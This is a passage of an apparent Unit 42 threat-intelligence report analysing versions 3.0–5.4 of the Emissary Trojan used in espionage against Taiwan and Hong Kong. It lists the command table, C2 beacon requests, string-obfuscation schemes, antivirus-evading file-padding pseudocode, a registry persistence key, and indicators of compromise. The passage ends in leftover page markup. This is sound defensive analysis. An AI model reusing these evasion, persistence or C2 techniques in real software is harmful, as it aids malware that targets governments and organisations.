Emissary_version_major;\r\nWORD Emissary_version_minor;\r\nCHAR[36] GUID_for_sample;\r\nWORD Unknown1;\r\nCHAR[128] Server1;\r\nCHAR[128] Server2;\r\nCHAR[128] Server3;\r\nCHAR[128] CampaignName;\r\nCHAR[550] Unknown2;\r\nWORD Delay_interval_seconds;\r\n};\r\nThis version of Emissary also introduced a new command handler that uses number-based commands instead of the GUID commands seen in prior versions of Emissary. The functionality of the commands are the same, however, the commands themselves are invoked using a number. Table 2 contains a list of available commands and a brief description of the functionality carried out by the command.\r\n\r\n\r\n\r\nCommand\r\nDescription\r\n\r\n\r\n102\r\nUpload a file to the C2 server.\r\n\r\n\r\n103\r\nExecutes a specified command.\r\n\r\n\r\n104\r\nDownload file from the C2 server.\r\n\r\n\r\n105\r\nUpdate configuration file.\r\n\r\n\r\n106\r\nCreate a remote shell.\r\n\r\n\r\n107\r\nUpdates the Trojan with a new executable.\r\n\r\n\r\n\r\nTable 2: New Emissary command handler\r\nThe network beacon sent from this version of Emissary is very similar to the beacon first introduced in Emissary version 2.0; however, the \"op\" value of \"101\" is hardcoded for the beacon and replaces the GUID based op designator to match the new command handler. The following is an example of the network beacon generated by this version of Emissary:\r\nGET \/default.aspx HTTP\/1.1\r\nUser-Agent: Mozilla\/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\nHost: 101.55.33.92\r\nCache-Control: no-cache\r\nCookie: guid=cae5e213-395a-4023-9a12-f78d3c4718e5; op=101\r\n\r\nVersion 5.0\r\nDate: 8\/25\/2015\r\n\r\nSHA256: c145bb2e4ce77c79aa01de2aec4a8b5b0b680e23bceda2c230903b5f0e119634, Original Name: WinDLL.dll\r\n\r\nEmissary version 5.0 closely resembles the out-of-order version 3.0 sample, which suggests that the malware author just forgot to change the version number of the out of order sample. While the configuration and Emissary DLL filenames used by the version 5.0 Emissary sample are the same as the out-of-order version 3.0 sample, the log file name differs but only slightly, as seen in the following list of related files:\r\n%TEMP%\\000A758C8FEAE5F.TMP -&gt; Log File\r\n%APPDATA%\\LocalData\\75BD50EC.DAT -&gt; Configuration file\r\n%APPDATA%\\LocalData\\A08E81B411.DAT -&gt; Emissary DLL\r\n%APPDATA%\\LocalData\\ishelp.dll -&gt; Loader DLL\r\n\r\nVersion 5.0 uses numbers within its command handler and the same configuration structure as the out-of-order version 3.0. The only major change in 5.0 is the ability to obtain a compromised system's external IP address by performing an HTTP GET request to \"http:\/\/showip.net\/index.php\". The code will parse the response from this webserver for the following to obtain the system's IP address:\r\n&lt;input id=\"checkip\" type=\"text\" name=\"check_ip\" value=\"[IP address parsed]\" \/&gt;\r\nThe SID value sent from the C2 server is encrypted using an algorithm that uses the XOR operation on the data using 0x76 as the key on the first byte and the resulting cleartext byte as the key on the next byte and so on. The network beacon sent from this version of Emissary visually resembles the out-of-order version, with the addition of a field \"SHO\" that contains the IP address of the compromised host. The following is an example of the Emissary version 5.0 network beacon, which is also the same in versions 5.1, 5.3 and 5.4 as well:\r\nGET \/default.aspx HTTP\/1.1\r\nUser-Agent: Mozilla\/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\nHost: 101.55.33.95\r\nCache-Control: no-cache\r\nCookie: guid=8cdef38c-808a-4e29-af6e-7386f02d28f1; op=101; SHO=172.16.107.130\r\n\r\nVersion 5.1\r\nDate: 9\/29\/2015\r\n\r\nSHA256: 375190cc8e0e75cf771d66347ea2a04b6d1b59bf2f56823eb81270618f133e2d\r\n\r\nOriginal Name: WinDLL.dll\r\n\r\nFor version 5.1 the malware author took out the exception handling in the Upload File command and obfuscated two strings within the Trojan to avoid detection. The strings exist in the Trojan in encrypted form and are decrypted using an algorithm that uses addition to each byte of ciphertext, using 65 (\"A\") as a key. The obfuscated strings, as seen below, involve the filename of the log file and the command prompt executable used to create the remote shell:\r\n\\xEF\\xEF\\xEF\\x00\\xF6\\xF4\\xF7\\x02\\xF7\\x05\\x04\\x00\\x04\\xF4\\x05\\xED\\x13\\x0C\\x0F = 000A758C8FEAE5F.TMP\r\n\\x22\\x2C\\x23\\xED\\x24\\x37\\x24 = cmd.exe\r\n\r\nDate: 10\/14\/2015\r\n\r\nSHA256: e369417a7623d73346f6dff729e68f7e057f7f6dae7bb03d56a7510cb3bfe538\r\n\r\nOriginal Name: WinDLL.dll\r\n\r\nIn an attempt to avoid detection based on PE header hashes, version 5.1 was recompiled without making any changes.\r\nVersion 5.3\r\nDate: 11\/7\/2015\r\n\r\nSHA256: 29d8dc863427c8e37b75eb738069c2172e79607acc7b65de6f8086ba36abf051\r\n\r\nOriginal Name: WinDLL.dll\r\n\r\nEmissary 5.3 moved some code used to create the remote shell out of a sub-function in an attempt to evade signatures used to detect the remote shell creation. For instance, in Emissary 5.1 the command handler would call an initial subfunction that would then call a second subfunction to carry out the activities to create and interact with the remote shell. In 5.3, the command handler calls an initial subfunction that carries out the activities to create and interact with the remote shell.\r\nVersion 5.4\r\nDate: 11\/23\/2015\r\n\r\nSHA256: 69b1d5454abe2475257defd9962a24a92411212c4f592de8765369a97f26c037 (Base DLL with junk data removed)\r\n\r\nOriginal Name WinDLL.dll\r\n\r\nVersion 5.4 of Emissary was the basis for the blog \u201cELISE: Security Through Obesity\u201d by Michael Yip of PWC. This blog provides a great analysis of this version of Emissary and we highly suggest reading it to become familiar with the Trojan.\r\n\r\nThere is one difference in the functional code between Emissary versions 5.3 and 5.4, which involves the removal of the command '107' used to update the Trojan. The string '107' still exists within the Trojan, however, the command handler does not check the C2 response for this command and the code used to update the Trojan has been removed.\r\n\r\nThe major difference between Emissary version 5.4 and all previous versions is how the Trojan is saved and loaded. First, the filenames of the various components of Emissary changed to the following; however, the filename for debug logs has not changed:\r\n%APPDATA%\\Programs\\Syncmgr.dll -&gt; Loader Trojan\r\n%APPDATA%\\Programs\\60HGBC00.DAT -&gt; Configuration File\r\n%APPDATA%\\Programs\\WEB2013BW6.DAT -&gt; Emissary Trojan\r\n%TEMP%\\000A758C8FEAE5F.TMP -&gt; Log file\r\n\r\nIn addition to file name changes, the biggest (pardon the pun) change involves the Loader Trojan (Syncmgr.dll) appending junk data to the end of the Emissary DLL file to make incredibly large files. The reason for creating such large files is to trick antivirus applications into not scanning the file, as it could exceed the maximum size of files the antivirus can scan (even VirusTotal has a maximum file size of 128MB). For instance, the following pseudo code contains two loops that will end up appending 524,288,000 bytes to the end of file, resulting in a DLL that exceeds 500MB in size:\r\nWriteFile(hFile, buf_EmissaryDllFromResource, nNumberOfBytesToWrite, &amp;nNumberOfBytesToWrite, 0);\r\nbuf_junkData = 0;\r\nret_time = time(0);\r\nsrand(ret_time);\r\nfor ( i = 0; i &lt; 51200; ++i )\r\n{\r\n  for ( j = 0; j &lt; 640; ++j )\r\n  {\r\n    random_byte = rand() % 255;\r\n    offset_in_buff_junkData = &amp;buf_junkData + 16 * j;\r\n    dword_junkData = 0x1010101 * random_byte;\r\n    *offset_in_buff_junkData = dword_junkData;\r\n    *(offset_in_buff_junkData + 1) = dword_junkData;\r\n    *(offset_in_buff_junkData + 2) = dword_junkData;\r\n    *(offset_in_buff_junkData + 3) = dword_junkData;\r\n  }\r\n  WriteFile(hFile, &amp;buf_junkData, 0x2800u, &amp;nNumberOfBytesToWrite, 0);\r\n}\r\n\r\nWith the new filenames, malware persistence is achieved via the following registry key:\r\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Syncmgr: \"rundll32.exe \"C:\\Documents and Settings\\[username]&gt;\\Application Data\\Programs\\Syncmgr.dll\",Setting\"\r\nDate: 11\/24\/2015\r\n\r\nSHA256: bfceccdd553c7e26006bb044ea6d87e597c7cce08218068e31dc940e9f55b636 (Base DLL with junk data removed)\r\n\r\nOriginal Name: WinDLL.dll\r\n\r\nIn another attempt to avoid detection based on PE header hashes, the Trojan was recompiled without making any changes.\r\nConclusion\r\nThe actors using Emissary, who were previously reported as behind Operation Lotus Blossom, have been active for at least seven years in Southeast Asia. They are persistent, evolve over time, and have enough resources to have multiple custom RATs that receive regular updates. The targeting is largely military or government, with some cases of higher education and high tech companies. They also have the ability to select and use appropriate decoys in multiple Asian languages that appear legitimate.\r\n\r\nThe use of Emissary appears to be focused only on Taiwan and Hong Kong, with regular malware updates to avoid detection and to increase the odds of success. Of particular note, there is an interesting coincidence between the timing of the publication of our Operation Lotus Blossom report and a flurry of Emissary updates. The first occurred ten days after publication and was followed by updates over increasingly shorter time frames, starting at roughly every three months and progressing to monthly by the final version discussed here. Until that publication, according to our research Emissary was updated roughly every two years. This indicates the threat actors may take note of threat intelligence reporting and are fully capable of making immediate changes when deemed necessary.\r\n\r\nIn addition to the malware evolution, the actors also shifted from solely spear-phishing targets with attachments to also compromising legitimate websites to host malware. The consistent updates to the Trojan and the shift in the actor\u2019s TTPs suggests that this threat will continue to use Emissary in future espionage related attacks.\r\n\r\nWe have updated the Emissary tag for Palo Alto Networks AutoFocus users to track this threat using the indicators discussed in this blog.\r\nEmissary Delivery Documents\r\n42b8898c07374b1fc6a4a33441aadf10e47f226d9d3bf3368a459c0e221dff73\r\n\r\n37f752f89b0384291af23542efc08c01be962c04e3b2c881a8bc1f8771e9179f\r\n\r\n52b7f93bd4c2d1b1818f2a9506551852e2e7b511c9298e71edb54a39f69f94f2\r\n\r\n5cda2251059c34f55ac23941b56e248b9a1111e98f62c5a307eadbb9618592dd\r\n\r\n70097adba2743653bc73d0a2909a13f2904dbbcc1ffdb4e9013a8e61866abf5c\r\n\r\n9bb0288f7b98fac909ed91ec24dad0d5a31e3eec93a1641849d9dab56c23aa59\r\n\r\nb201c89fd7bdfc625bacfd4850feaa81269d9b41ed10ba1f7c0cb1339f4a6abe\r\n\r\nddbe42fb03bf9f4b9144396e814f13cd7054dcf238234dcb838fa9643136c03a\r\n\r\ne67d3cc1684c789c3bd02af7a68b783fd90dc6d2d660b174d533f4c0e07490f9\r\n\r\n0c550fad82f2653bc13d9629357a2a56df82602ee0ce96aa5a31f885e3aa29df\r\n\r\nf36b7f63f46ae6afe8882b34c1ec11597c8537a3a7fa8b6521a83308940cc77b\r\nEmissary Installers\/Loaders\r\nfdcd10a2c2bf802ba5b6be55c16c0bf407bcbee902b66466b0f954d2951fad2d\r\n\r\nda29b647411153b49cbf4df862e3f36209eafb8ebe8b966429edec4fb15dbce9\r\n\r\n721676d529a0c439594502f1d53fec697adc80fa1301d2bf20c2600d99ceed4e\r\n\r\n0069029ee4029df88f700da335a06e0e3a534a94552fe966186166b526a20b6a\r\n\r\n9420017390c598ee535c24f7bcbd39f40eca699d6c94dc35bcf59ddf918c59ab\r\n\r\n26e2f4f9026f19156a73ffbfde438916f24d80b8812b6cebe98167eb9be0863c\r\n\r\n8e3b7dc3dca92d7458265e2bcd69caa558cbbf24bbbf1200b9aa924260c42480\r\n\r\ne817610b62ccd00bdfc9129f947ac7d078d97525e9628a3aa61027396dba419b\r\n\r\n02831316a3a04c1248605f28fb08d810230dd4411b2a1fc8187508aea6b449c5\r\n\r\n675869fac21a94c8f470765bc6dd15b17cc4492dd639b878f241a45b2c3890fc\r\n\r\n70561f58c9e5868f44169854bcc906001947d98d15e9b4d2fbabd1262d938629\r\n\r\n925d2f960d8db0510f3681c038311c0c2df86c5ba03f8cb61e3c8846c31bd6e1\r\n\r\n98fb1d2975babc18624e3922406545458642e01360746870deee397df93f50e0\r\n\r\na8b0d084949c4f289beb4950f801bf99588d1b05f68587b245a31e8e82f7a1b8\r\n\r\nb07fbb92484fd2aff6d28f0ab04d5f51e96420b6d670f921b0bbe0e5392da408\r\n\r\nc72b07f2a423abc4fc45dfddc5162b8eb1ea97d5b5e66811526433f09b6cdf41\r\n\r\ndd8ffb9f961299f7cc9cb51e17a5cccf79b7fb583e594b05ef93b54c8cad54f6\r\n\r\nfbcb401cf06326ab4bb53fb9f01f1ca647f16f926811ea66984f1a1b8cf2f7bb\r\n\r\ne21b47dfa9e250f49a3ab327b7444902e545bed3c4dcfa5e2e990af20593af6d\r\nEmissary DLL Version 1.0 through 5.4\r\na7d07b92e48876e2195e5d8769a47cf0a237e11ac304e41b14fc36042b0d9484\r\n\r\ne6c4611b1399ada920730686395d6fc1700fc39add3d0d40b4f784ccb6ad0c30\r\n\r\n931a1284b11a3997c7a99076d582ed3436aa30409dc73bd763436dddd490f9cb\r\n\r\n5edf2d0270f8e7eb5be3476802e46c578c4afc4b046411be0806b9acc3bfa099\r\n\r\n9dab2d1b16eb0fb4ec2095d4b4e2a3ad67a707ab4f54f9c26539619691f103f3\r\n\r\ndcbeca8c92d6d18f2faf385e677913dc8abac3fa3303c1f5cfe166180cffbed3\r\n\r\n5171c9a593389011da4d72125e52bf7ef86b2da7fcd6c2a2bc95467afe6a1b58\r\n\r\n70bed57bc3484fe5dbcf3c732bd7b11f80a742138f4733bc7e9b6d03e721da4a\r\n\r\nc145bb2e4ce77c79aa01de2aec4a8b5b0b680e23bceda2c230903b5f0e119634\r\n\r\n375190cc8e0e75cf771d66347ea2a04b6d1b59bf2f56823eb81270618f133e2d\r\n\r\ne369417a7623d73346f6dff729e68f7e057f7f6dae7bb03d56a7510cb3bfe538\r\n\r\n29d8dc863427c8e37b75eb738069c2172e79607acc7b65de6f8086ba36abf051\r\n\r\n46ad72811990c1937d26e1f80ec1b9def8c112817f4bb9f94e3d1e4f0fb86f80\r\n\r\nbfceccdd553c7e26006bb044ea6d87e597c7cce08218068e31dc940e9f55b636\r\n\r\n731cd2ce87f4c4375782de0686b5b16619f8fa2de188522cbc8e64f8851bb7ed\r\n\r\nacf7dc5a10b00f0aac102ecd9d87cd94f08a37b2726cb1e16948875751d04cc9\r\nEmissary C2 URLs\r\nhttp:\/\/101.55.121[.]79\/lightserver\/Default.aspx\r\nhttp:\/\/101.55.33[.]92\/default.aspx\r\nhttp:\/\/101.55.33[.]92:80\/default.aspx\r\nhttp:\/\/101.55.33[.]95:80\/default.aspx\r\nhttp:\/\/103.243.24[.]179\/Default.aspx\r\nhttp:\/\/118.193.221[.]233:80\/default.aspx\r\nhttp:\/\/123.1.159[.]153\/lightserver\/Default.aspx\r\nhttp:\/\/123.1.159[.]210\/lightserver\/Default.aspx\r\nhttp:\/\/140.131.39[.]11\/icanxp\/help\/help\/default.aspx\r\nhttp:\/\/163.20.127[.]27\/0test\/test\/default.aspx\r\nhttp:\/\/203.124.14[.]214\/default.aspx\r\nhttp:\/\/203.124.14[.]229\/default.aspx\r\nhttp:\/\/210.209.121[.]31\/lightserver\/default.aspx\r\nhttp:\/\/210.209.121[.]92\/lightserver\/Default.aspx\r\nhttp:\/\/210.209.121[.]92\/weboffice\/Default.aspx\r\nhttp:\/\/appletree.onthenetas[.]com\/Default.aspx\r\nhttp:\/\/bluefield.byinter[.]net\/lightserver\/Default.aspx\r\nhttp:\/\/booking.passinggas[.]net\/lightserver\/Default.aspx\r\nhttp:\/\/chairman.OnTheNetAs[.]com\/weboffice\/Default.aspx\r\nhttp:\/\/dnt5b.myfw[.]us\/Default.aspx\r\nhttp:\/\/dnt5b.myfw[.]us\/default.aspx\r\nhttp:\/\/eventlog.findhere[.]org\/Default.aspx\r\nhttp:\/\/grassland.OnTheNetAs[.]com\/lightserver\/Default.aspx\r\nhttp:\/\/groupspace.findhere[.]org\/lightserver\/Default.aspx\r\nhttp:\/\/photograph.myfw[.]us\/lightserver\/default.aspx\r\nhttp:\/\/ustar5.PassAs[.]us\/Default.aspx\r\nhttp:\/\/ustar5.PassAs[.]us\/default.aspx\r\nhttp:\/\/webonline.OnTheNetAs[.]com\/lightserver\/default.aspx\r\nhttp:\/\/www.danangqt[.]net:80\/default.aspx\r\nhttp:\/\/zooboo.PassingGas[.]net\/weboffice\/Default.aspx\r\nEmissary Campaign Codes\r\n3test\r\nFJ201508\r\nlyk_WW\r\nA-1117a\r\nQPR-Z0330\r\nYUIO\r\nZGP-M\r\nxman\r\nA-1117a\r\nFlash\r\nFJ20151125\r\nYUIO\r\nll\r\nA-1231a\r\nux-2011\r\nRT101212\r\n111\r\nUPG-ZHG-01\r\nIC00001","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"","width":"","height":""},"speakable":{"@type":"SpeakableSpecification","xPath":["\/html\/head\/title","\/html\/head\/meta[@name='description']\/@content"]},"author":[{"@type":"Person","name":"Robert Falcone"},{"@type":"Person","name":"Jen Miller-Osborn"}]}</script><link rel='stylesheet' id='crayon-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' media='all' />
<style id='co-authors-plus-coauthors-style-inline-css'>
.wp-block-co-authors-plus-coauthors.is-layout-flow [class*=wp-block-co-authors-plus]{display:inline}

</style>
<style id='co-authors-plus-avatar-style-inline-css'>
.wp-block-co-authors-plus-avatar :where(img){height:auto;max-width:100%;vertical-align:bottom}.wp-block-co-authors-plus-coauthors.is-layout-flow .wp-block-co-authors-plus-avatar :where(img){vertical-align:middle}.wp-block-co-authors-plus-avatar:is(.alignleft,.alignright){display:table}.wp-block-co-authors-plus-avatar.aligncenter{display:table;margin-inline:auto}

</style>
<style id='co-authors-plus-image-style-inline-css'>
.wp-block-co-authors-plus-image{margin-bottom:0}.wp-block-co-authors-plus-image :where(img){height:auto;max-width:100%;vertical-align:bottom}.wp-block-co-authors-plus-coauthors.is-layout-flow .wp-block-co-authors-plus-image :where(img){vertical-align:middle}.wp-block-co-authors-plus-image:is(.alignfull,.alignwide) :where(img){width:100%}.wp-block-co-authors-plus-image:is(.alignleft,.alignright){display:table}.wp-block-co-authors-plus-image.aligncenter{display:table;margin-inline:auto}

</style>
<style id='safe-svg-svg-icon-style-inline-css'>
.safe-svg-cover{text-align:center}.safe-svg-cover .safe-svg-inside{display:inline-block;max-width:100%}.safe-svg-cover svg{height:100%;max-height:100%;max-width:100%;width:100%}

</style>
<style id='classic-theme-styles-inline-css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='post-views-counter-frontend-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.min.css?ver=1.4.7' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.min.css?ver=1' media='all' />
<link rel='stylesheet' id='unit42-v6-style-css' href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/style.css?ver=1.0.0' media='all' />
<link rel='stylesheet' id='unit42-v6-head-styles-css' href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/css/head-styles.css?ver=1.0.0' media='all' />
<link rel='stylesheet' id='unit42-v5-custom-styles-css' href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/css/main.css?ver=1.0.0' media='all' />
<link rel='stylesheet' id='unit42-v6-plugin-styles-css' href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/css/plugin.css?ver=1.0.0' media='all' />
<link rel='stylesheet' id='unit42-v6-custom-styles-css' href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/css/main-redesign.css?ver=1.0.0' media='all' />
<link rel='stylesheet' id='like-dislike-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/css/ldc-lite.css?ver=1.0.0' media='all' />
<script src="https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script src="https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<script id="crayon_js-js-extra">
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
</script>
<script src="https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta" id="crayon_js-js"></script>
<script id="post-views-counter-frontend-js-before">
